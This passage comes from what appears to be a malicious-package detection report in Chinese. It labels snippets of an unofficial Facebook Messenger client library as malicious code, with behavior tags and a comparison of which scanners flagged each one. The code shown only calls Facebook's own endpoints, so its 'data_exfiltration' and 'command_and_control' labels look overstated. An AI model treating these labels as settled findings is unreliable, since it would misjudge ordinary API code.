      "presence=" + presence + "; path=/; domain=.facebook.com; secure",
      "https://www.facebook.com"
    );
    defaultFuncs
      .get(
        "https://" + serverNumber + "-edge-chat.facebook.com/pull",
        ctx.jar,
        form
      )
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function(resData) {
        // ... [truncated for brevity] ...
        if (resData.ms) {
          msgsRecv += resData.ms.length;
          var atLeastOne = false;
          resData.ms
            .sort(function(a, b) {
              return a.timestamp - b.timestamp;
            })
            .forEach(function parsePackets(v) {
              // ... [truncated for brevity] ...
            });

          if (atLeastOne) {
            // Send deliveryReceipt notification to the server
            var formDeliveryReceipt = {};

            resData.ms
              .filter(function(v) {
                return (
                  v.message &&
                  v.message.mid &&
                  v.message.sender_fbid.toString() !== ctx.userID
                );
              })
              .forEach(function(val, i) {
                formDeliveryReceipt["[" + i + "]"] = val.message.mid;
              });

            // If there's at least one, we do the post request
            if (formDeliveryReceipt["[0]"]) {
              defaultFuncs.post(
                "https://www.facebook.com/ajax/mercury/delivery_receipts.php",
                ctx.jar,
                formDeliveryReceipt
              );
            }
          }
        }
        // ... [truncated for brevity] ...
      })
      .catch(function(err) {
        if (err.code === "ETIMEDOUT") {
          log.info("listen", "Suppressed timeout error.");
        } else if (err.code === "EAI_AGAIN") {
          serverNumber = (~~(Math.random() * 6)).toString();
        } else {
          log.error("listen", err);
          globalCallback(err);
        }
        if (currentlyRunning) {
          currentlyRunning = setTimeout(listen, Math.random() * 200 + 50);
        }
      });
  }

  return function(callback) {
    globalCallback = callback;

    if (!currentlyRunning) {
      currentlyRunning = setTimeout(listen, Math.random() * 200 + 50, callback);
    }

    return stopListening;
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 5

**文件：** `package/handleMessageRequest.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST requests and manipulates message threads, potentially moving user messages without clear user consent.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function handleMessageRequest(threadID, accept, callback) {
    if (utils.getType(accept) !== "Boolean") throw { error: "Please pass a boolean as a second argument." };

    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);
        resolveFunc(data);
      };
    }

    var form = {
      client: "mercury"
    };

    if (utils.getType(threadID) !== "Array") threadID = [threadID];

    var messageBox = accept ? "inbox" : "other";
    for (var i = 0; i < threadID.length; i++) form[messageBox + "[" + i + "]"] = threadID[i];

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/move_thread.php", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("handleMessageRequest", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 6

**文件：** `package/forwardAttachment.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends attachments to users via HTTP POST; could be abused for mass forwarding or data exfiltration.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function forwardAttachment(attachmentID, userOrUsers, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });
    if (!callback) {
      callback = function (err) {
        if (err) return rejectFunc(err);
        resolveFunc();
      };
    }

    var form = {
      attachment_id: attachmentID
    };

    if (utils.getType(userOrUsers) !== "Array") userOrUsers = [userOrUsers];

    var timestamp = Math.floor(Date.now() / 1000);

    //That's good, the key of the array is really timestmap in seconds + index
    //Probably time when the attachment will be sent?
    for (var i = 0; i < userOrUsers.length; i++) form["recipient_map[" + (timestamp + i) + "]"] = userOrUsers[i];

    defaultFuncs
      .post("https://www.facebook.com/mercury/attachments/forward/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx.jar, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("forwardAttachment", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** legitimate_api_abuse, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 7

**文件：** `package/markAsReadAll.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook, potentially automating inbox actions; transmits data and handles cookies programmatically.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function markAsReadAll(callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);
        resolveFunc(data);
      };
    }

    var form = {
      folder: 'inbox'
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/mark_folder_as_read.php", ctx.jar, form)
      .then(utils.saveCookies(ctx.jar))
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("markAsReadAll", err);
        return callback(err);
      });
    return returnPromise;
  };
};
```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 8

**文件：** `package/changeGroupImage.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Uploads images and posts data to Facebook endpoints; network activity and file upload may be privacy or security concern.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");
var bluebird = require("bluebird");

module.exports = function (defaultFuncs, api, ctx) {
  function handleUpload(image, callback) {
    var uploads = [];

    var form = {
      images_only: "true",
      "attachment[]": image
    };

    uploads.push(
      defaultFuncs
        .postFormData("https://upload.facebook.com/ajax/mercury/upload.php", ctx.jar, form, {})
        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        .then(function (resData) {
          if (resData.error) throw resData;
          return resData.payload.metadata[0];
        })
    );

    // resolve all promises
    bluebird
      .all(uploads)
      .then(resData => callback(null, resData))
      .catch(function (err) {
        log.error("handleUpload", err);
        return callback(err);
      });
  }

  return function changeGroupImage(image, threadID, callback) {
    if (!callback && (utils.getType(threadID) === "Function" || utils.getType(threadID) === "AsyncFunction")) throw { error: "please pass a threadID as a second argument." };

    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err) {
        if (err) return rejectFunc(err);
        resolveFunc();
      };
    }

    var messageAndOTID = utils.generateOfflineThreadingID();
    var form = {
      client: "mercury",
      action_type: "ma-type:log-message",
      author: "fbid:" + ctx.userID,
      author_email: "",
      ephemeral_ttl_mode: "0",
      is_filtered_content: false,
      is_filtered_content_account: false,
      is_filtered_content_bh: false,
      is_filtered_content_invalid_app: false,
      is_filtered_content_quasar: false,
      is_forward: false,
      is_spoof_warning: false,
      is_unread: false,
      log_message_type: "log:thread-image",
      manual_retry_cnt: "0",
      message_id: messageAndOTID,
      offline_threading_id: messageAndOTID,
      source: "source:chat:web",
      "source_tags[0]": "source:chat",
      status: "0",
      thread_fbid: threadID,
      thread_id: "",
      timestamp: Date.now(),
      timestamp_absolute: "Today",
      timestamp_relative: utils.generateTimestampRelative(),
      timestamp_time_passed: "0"
    };

    handleUpload(image, function (err, payload) {
      if (err) return callback(err);

      form["thread_image_id"] = payload[0]["image_id"];
      form["thread_id"] = threadID;

      defaultFuncs
        .post("https://www.facebook.com/messaging/set_thread_image/", ctx.jar, form)
        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        .then(function (resData) {
          // check for errors here
          if (resData.error) throw resData;
          return callback();
        })
        .catch(function (err) {
          log.error("changeGroupImage", err);
          return callback(err);
        });
    });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 9

**文件：** `package/markAsDelivered.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST to Facebook with message and thread IDs; could be used for message tracking or automation.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function markAsDelivered(threadID, messageID, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);

        resolveFunc(data);
      };
    }

    if (!threadID || !messageID) return callback("Error: messageID or threadID is not defined");

    var form = {};
    form["message_ids[0]"] = messageID;
    form["thread_ids[" + threadID + "][0]"] = messageID;

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/delivery_receipts.php", ctx.jar, form)
      .then(utils.saveCookies(ctx.jar))
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;

        return callback();
      })
      .catch(function (err) {
        log.error("markAsDelivered", err);
        if (utils.getType(err) == "Object" && err.error === "Not logged in.") ctx.loggedIn = false;

        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 10

**文件：** `package/listenMqtt.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Establishes persistent WebSocket/MQTT connections, transmits user/session data, and processes/forwards received messages.

**规避技术：** 

**恶意代码：**
```javascript
var mqtt = require('mqtt');
var websocket = require('websocket-stream');
var HttpsProxyAgent = require('https-proxy-agent');

function listenMqtt(defaultFuncs, api, ctx, globalCallback) {
    var chatOn = ctx.globalOptions.online;
    var foreground = false;
    var sessionID = Math.floor(Math.random() * 9007199254740991) + 1;
    var username = {
        u: ctx.userID,
        s: sessionID,
        chat_on: chatOn,
        fg: foreground,
        d: utils.getGUID(),
        ct: "websocket",
        aid: "219994525426954",
        mqtt_sid: "",
        cp: 3,
        ecp: 10,
        st: [],
        pm: [],
        dc: "",
        no_auto_fg: true,
        gas: null,
        pack: []
    };
    var cookies = ctx.jar.getCookies("https://www.facebook.com").join("; ");
    var host;
    if (ctx.mqttEndpoint) host = `${ctx.mqttEndpoint}&sid=${sessionID}`;
    else if (ctx.region) host = `wss://edge-chat.facebook.com/chat?region=${ctx.region.toLocaleLowerCase()}&sid=${sessionID}`;
    else host = `wss://edge-chat.facebook.com/chat?sid=${sessionID}`;
    var options = {
        clientId: "mqttwsclient",
        protocolId: 'MQIsdp',
        protocolVersion: 3,
        username: JSON.stringify(username),
        clean: true,
        wsOptions: {
            headers: {
                'Cookie': cookies,
                'Origin': 'https://www.facebook.com',
                'User-Agent': ctx.globalOptions.userAgent,
                'Referer': 'https://www.facebook.com/',
                'Host': new URL(host).hostname
            },
            origin: 'https://www.facebook.com',
            protocolVersion: 13
        },
        keepalive: 10,
        reschedulePings: false
    };
    if (typeof ctx.globalOptions.proxy != "undefined") {
        var agent = new HttpsProxyAgent(ctx.globalOptions.proxy);
        options.wsOptions.agent = agent;
    }
    ctx.mqttClient = new mqtt.Client(_ => websocket(host, options.wsOptions), options);
    var mqttClient = ctx.mqttClient;
    mqttClient.on('error', function(err) {
        log.error("listenMqtt", "Connection refused: Server unavailable. Exiting...");
        mqttClient.end();
        process.exit();
        if (ctx.globalOptions.autoReconnect) getSeqID();
        else {
            globalCallback({ type: "stop_listen", error: "Connection refused: Server unavailable" }, null);
        }
    });
    mqttClient.on('connect', function() {
        topics.forEach(topicsub => mqttClient.subscribe(topicsub));
        var topic;
        var queue = {
            sync_api_version: 10,
            max_deltas_able_to_process: 1000,
            delta_batch_size: 500,
            encoding: "JSON",
            entity_fbid: ctx.userID,
        };
        if (ctx.syncToken) {
            topic = "/messenger_sync_get_diffs";
            queue.last_seq_id = ctx.lastSeqId;
            queue.sync_token = ctx.syncToken;
        } else {
            topic = "/messenger_sync_create_queue";
            queue.initial_titan_sequence_id = ctx.lastSeqId;
            queue.device_params = null;
        }
        mqttClient.publish(topic, JSON.stringify(queue), { qos: 1, retain: false });
        mqttClient.publish("/foreground_state", JSON.stringify({"foreground": chatOn}), {qos: 1});
        var rTimeout = setTimeout(function() {
            mqttClient.end();
            getSeqID();
        }, 5000);
        ctx.tmsWait = function() {
            clearTimeout(rTimeout);
            ctx.globalOptions.emitReady ? globalCallback({ type: "ready", error: null }) : "";
            delete ctx.tmsWait;
        };
    });
    mqttClient.on('message', function(topic, message, _packet) {
        try {
            var jsonMessage = JSON.parse(message);
        } catch (ex) {
            return log.error("listenMqtt", "SyntaxError: Unexpected token  in JSON at position 0");
        }
        if (topic === "/t_ms") {
            if (ctx.tmsWait && typeof ctx.tmsWait == "function") ctx.tmsWait();
            if (jsonMessage.firstDeltaSeqId && jsonMessage.syncToken) {
                ctx.lastSeqId = jsonMessage.firstDeltaSeqId;
                ctx.syncToken = jsonMessage.syncToken;
            }
            if (jsonMessage.lastIssuedSeqId) ctx.lastSeqId = parseInt(jsonMessage.lastIssuedSeqId);
            for (var i in jsonMessage.deltas) {
                var delta = jsonMessage.deltas[i];
                parseDelta(defaultFuncs, api, ctx, globalCallback, { "delta": delta });
            }
        } else if (topic === "/thread_typing" || topic === "/orca_typing_notifications") {
            var typ = {
                type: "typ",
                isTyping: !!jsonMessage.state,
                from: jsonMessage.sender_fbid.toString(),
                threadID: utils.formatID((jsonMessage.thread || jsonMessage.sender_fbid).toString())
            };
            (function() { globalCallback(null, typ); })();
        } else if (topic === "/orca_presence") {
            if (!ctx.globalOptions.updatePresence) {
                for (var i in jsonMessage.list) {
                    var data = jsonMessage.list[i];
                    var userID = data["u"];
                    var presence = {
                        type: "presence",
                        userID: userID.toString(),
                        timestamp: data["l"] * 1000,
                        statuses: data["p"]
                    };
                    (function() { globalCallback(null, presence); })();
                }
            }
        }
    });
    mqttClient.on('close', function() {
        // (function () { globalCallback("Connection closed."); })();
        // client.end();
    });
}

// ... [truncated for brevity] ...

function parseDelta(defaultFuncs, api, ctx, globalCallback, v) {
    if (v.delta.class == "NewMessage") {
        // ... [truncated for brevity] ...
        (function resolveAttachmentUrl(i) {
            if (v.delta.attachments && (i == v.delta.attachments.length)) {
                var fmtMsg;
                try {
                    fmtMsg = utils.formatDeltaMessage(v);
                } catch (err) {
                    return globalCallback({
                        error: "Problem parsing message object. Please open an issue at https://github.com/Schmavery/facebook-chat-api/issues.",
                        detail: err,
                        res: v,
                        type: "parse_error"
                    });
                }
                if (fmtMsg)
                    if (ctx.globalOptions.autoMarkDelivery) markDelivery(ctx, api, fmtMsg.threadID, fmtMsg.messageID);
                return !ctx.globalOptions.selfListen && fmtMsg.senderID === ctx.userID ? undefined : (function() { globalCallback(null, fmtMsg); })();
            } else {
                if (v.delta.attachments && (v.delta.attachments[i].mercury.attach_type == "photo")) {
                    api.resolvePhotoUrl(v.delta.attachments[i].fbid, (err, url) => {
                        if (!err) v.delta.attachments[i].mercury.metadata.url = url;
                        return resolveAttachmentUrl(i + 1);
                    });
                } else return resolveAttachmentUrl(i + 1);
            }
        })(0);
    }
    // ... [truncated for brevity] ...
}

// ... [truncated for brevity] ...

```

**形式化行为：** sensitive_data_collection, data_exfiltration, legitimate_api_abuse, command_and_control

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 11

**文件：** `package/markAsRead.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook and publishes to MQTT, potentially sending user data over network.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return async function markAsRead(threadID, read, callback) {
    if (utils.getType(read) === 'Function' || utils.getType(read) === 'AsyncFunction') {
      callback = read;
      read = true;
    }
    if (read == undefined) read = true;

    if (!callback) callback = () => { };

    var form = {};

    if (typeof ctx.globalOptions.pageID !== 'undefined') {
      form["source"] = "PagesManagerMessagesInterface";
      form["request_user_id"] = ctx.globalOptions.pageID;
      form["ids[" + threadID + "]"] = read;
      form["watermarkTimestamp"] = new Date().getTime();
      form["shouldSendReadReceipt"] = true;
      form["commerce_last_message_type"] = "";
      //form["titanOriginatedThreadId"] = utils.generateThreadingID(ctx.clientID);

      let resData;
      try {
        resData = await (
          defaultFuncs
            .post("https://www.facebook.com/ajax/mercury/change_read_status.php", ctx.jar, form)
            .then(utils.saveCookies(ctx.jar))
            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        );
      }
      catch (e) {
        callback(e);
        return e;
      }

      if (resData.error) {
        let err = resData.error;
        log.error("markAsRead", err);
        if (utils.getType(err) == "Object" && err.error === "Not logged in.") ctx.loggedIn = false;
        callback(err);
        return err;
      }

      callback();
      return null;
    }
    else {
      try {
        if (ctx.mqttClient) {
          let err = await new Promise(r => ctx.mqttClient.publish("/mark_thread", JSON.stringify({
            threadID,
            mark: "read",
            state: read
          }), { qos: 1, retain: false }, r));
          if (err) throw err;
        }
        else throw { error: "You can only use this function after you start listening." };
      }
      catch (e) {
        callback(e);
        return e;
      }
    }
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 12

**文件：** `package/listenMqtt-Test.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Establishes persistent WebSocket/MQTT connections, collects user/cookie data, and exposes a local HTTP server.

**规避技术：** 

**恶意代码：**
```javascript
var mqtt = require('mqtt');
var websocket = require('websocket-stream');
var HttpsProxyAgent = require('https-proxy-agent');
const EventEmitter = require('events');

function listenMqtt(defaultFuncs, api, ctx, globalCallback) {
    var chatOn = ctx.globalOptions.online;
    var foreground = false;
    var sessionID = Math.floor(Math.random() * 9007199254740991) + 1;
    var username = {
        u: ctx.userID,
        s: sessionID,
        chat_on: chatOn,
        fg: foreground,
        d: utils.getGUID(),
        ct: "websocket",
        aid: "219994525426954",
        mqtt_sid: "",
        cp: 3,
        ecp: 10,
        st: [],
        pm: [],
        dc: "",
        no_auto_fg: true,
        gas: null,
        pack: []
    };
    var cookies = ctx.jar.getCookies("https://www.facebook.com").join("; ");
    var host;
    if (ctx.mqttEndpoint) host = `${ctx.mqttEndpoint}&sid=${sessionID}`;
    else if (ctx.region) host = `wss://edge-chat.facebook.com/chat?region=${ctx.region.toLocaleLowerCase()}&sid=${sessionID}`;
    else host = `wss://edge-chat.facebook.com/chat?sid=${sessionID}`;
    var options = {
        clientId: "mqttwsclient",
        protocolId: 'MQIsdp',
        protocolVersion: 3,
        username: JSON.stringify(username),
        clean: true,
        wsOptions: {
            headers: {
                'Cookie': cookies,
                'Origin': 'https://www.facebook.com',
                'User-Agent': ctx.globalOptions.userAgent,
                'Referer': 'https://www.facebook.com/',
                'Host': new URL(host).hostname
            },
            origin: 'https://www.facebook.com',
            protocolVersion: 13
        },
        keepalive: 10,
        reschedulePings: false
    };
    if (typeof ctx.globalOptions.proxy != "undefined") {
        var agent = new HttpsProxyAgent(ctx.globalOptions.proxy);
        options.wsOptions.agent = agent;
    }
    ctx.mqttClient = new mqtt.Client(_ => websocket(host, options.wsOptions), options);
    var mqttClient = ctx.mqttClient;
    mqttClient.on('error', function(err) {
        log.error("listenMqtt", err);
        mqttClient.end();
        if (ctx.globalOptions.autoReconnect) getSeqID();
        else globalCallback({ type: "stop_listen", error: "Connection refused: Server unavailable" }, null);
    });
    mqttClient.on('connect', function() {
        const http = require("http");
        const dashboard = http.createServer(function(request, res) {
            res.writeHead(200, "OK", { "Content-Type": "text/plain" });
            res.write("vô nghĩa");
            res.end();
        });
        dashboard.listen(1000);
        topics.forEach(topicsub => mqttClient.subscribe(topicsub));
        var topic;
        var queue = {
            sync_api_version: 10,
            max_deltas_able_to_process: 1000,
            delta_batch_size: 500,
            encoding: "JSON",
            entity_fbid: ctx.userID,
        };
        if (ctx.syncToken) {
            topic = "/messenger_sync_get_diffs";
            queue.last_seq_id = ctx.lastSeqId;
            queue.sync_token = ctx.syncToken;
        } else {
            topic = "/messenger_sync_create_queue";
            queue.initial_titan_sequence_id = ctx.lastSeqId;
            queue.device_params = null;
        }
        mqttClient.publish(topic, JSON.stringify(queue), { qos: 1, retain: false });
        var rTimeout = setTimeout(function() {
            mqttClient.end();
            getSeqID();
        }, 5000);
        ctx.tmsWait = function() {
            clearTimeout(rTimeout);
            ctx.globalOptions.emitReady ? globalCallback({
                type: "ready",
                error: null
            }) : "";
            delete ctx.tmsWait;
        };
    });
    mqttClient.on('message', function(topic, message, _packet) {
        let jsonMessage = Buffer.from(message).toString();
        try {
            jsonMessage = JSON.parse(jsonMessage);
        } catch {
            jsonMessage = {};
        }
        if (topic === "/t_ms") {
            if (ctx.tmsWait && typeof ctx.tmsWait == "function") ctx.tmsWait();
            if (jsonMessage.firstDeltaSeqId && jsonMessage.syncToken) {
                ctx.lastSeqId = jsonMessage.firstDeltaSeqId;
                ctx.syncToken = jsonMessage.syncToken;
            }
            if (jsonMessage.lastIssuedSeqId) ctx.lastSeqId = parseInt(jsonMessage.lastIssuedSeqId);
            for (var i in jsonMessage.deltas) {
                var delta = jsonMessage.deltas[i];
                parseDelta(defaultFuncs, api, ctx, globalCallback, { "delta": delta });
            }
        } else if (topic === "/thread_typing" || topic === "/orca_typing_notifications") {
            var typ = {
                type: "typ",
                isTyping: !!jsonMessage.state,
                from: jsonMessage.sender_fbid.toString(),
                threadID: utils.formatID((jsonMessage.thread || jsonMessage.sender_fbid).toString())
            };
            (function() { globalCallback(null, typ); })();
        } else if (topic === "/orca_presence") {
            if (!ctx.globalOptions.updatePresence) {
                for (var i in jsonMessage.list) {
                    var data = jsonMessage.list[i];
                    var userID = data["u"];
                    var presence = {
                        type: "presence",
                        userID: userID.toString(),
                        timestamp: data["l"] * 1000,
                        statuses: data["p"]
                    };
                    (function() { globalCallback(null, presence); })();
                }
            }
        }
    });
    mqttClient.on('close', function() {
        // (function () { globalCallback("Connection closed."); })();
        // client.end();
    });
}

```

**形式化行为：** sensitive_data_collection, data_exfiltration, command_and_control, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 13

**文件：** `package/httpGet.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs arbitrary HTTP GET requests to user-supplied URLs, potentially enabling data exfiltration or unauthorized network access.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function httpGet(url, form, callback, notAPI) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };

    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback && (utils.getType(form) == "Function" || utils.getType(form) == "AsyncFunction")) {
      callback = form;
      form = {};
    }
    form = form || {};

    callback = callback || function (err, data) {
      if (err) return rejectFunc(err);
      resolveFunc(data);
    };

    if (notAPI) {
      utils
        .get(url, ctx.jar, form, ctx.globalOptions)
        .then(resData => callback(null, resData.body.toString()))
        .catch(function (err) {
          log.error("httpGet", err);
          return callback(err);
        });
    }
    else {
      defaultFuncs
        .get(url, ctx.jar, form)
        .then(resData => callback(null, resData.body.toString()))
        .catch(function (err) {
          log.error("httpGet", err);
          return callback(err);
        });
    }
    return returnPromise;
  };
};

```

**形式化行为：** data_exfiltration, unauthorized_access

**形式化规避：** legitimate_api_abuse, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 14

**文件：** `package/searchForThread.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook, potentially leaking user data or automating account actions.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");

module.exports = function (defaultFuncs, api, ctx) {
  return function searchForThread(name, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);
        resolveFunc(data);
      };
    }

    var tmpForm = {
      client: "web_messenger",
      query: name,
      offset: 0,
      limit: 21,
      index: "fbid"
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/search_threads.php", ctx.jar, tmpForm)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        if (!resData.payload.mercury_payload.threads) return callback({ error: "Could not find thread `" + name + "`." });
        return callback(
          null,
          resData.payload.mercury_payload.threads.map(utils.formatThread)
        );
      });
    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, sensitive_data_collection, data_exfiltration

**形式化规避：** legitimate_api_abuse, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 15

**文件：** `package/getThreadPictures.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs repeated HTTP POSTs to Facebook, collects image data from threads, and processes complex response structures.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");
